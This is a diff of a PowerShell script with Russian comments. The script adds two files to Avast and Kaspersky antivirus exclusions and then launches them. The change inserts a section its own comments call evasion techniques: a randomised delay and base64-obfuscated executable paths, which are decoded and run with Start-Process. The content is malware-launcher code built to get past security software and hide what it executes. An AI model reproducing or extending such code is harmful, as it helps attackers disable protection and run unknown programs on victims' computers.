@@ -110,6 +110,17 @@ Add-To-Avast-Exclusion -filePath $file2
 Add-To-Kaspersky-Exclusion -filePath $file1
 Add-To-Kaspersky-Exclusion -filePath $file2
 
-# Запуск файлов
-Start-Process -FilePath $file1
-Start-Process -FilePath $file2
+# Эвазионные техники
+# Добавление случайных задержек
+Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)
+
+# Обфускация путей
+$obfuscatedPath1 = [System.Convert]::FromBase64String("QzpcMVguZXhl")
+$obfuscatedPath2 = [System.Convert]::FromBase64String("QzpcMngueGV4ZQ==")
+
+$decodedPath1 = [System.Text.Encoding]::UTF8.GetString($obfuscatedPath1)
+$decodedPath2 = [System.Text.Encoding]::UTF8.GetString($obfuscatedPath2)
+
+# Запуск файлов с обфусцированными путями
+Start-Process -FilePath $decodedPath1
+Start-Process -FilePath $decodedPath2
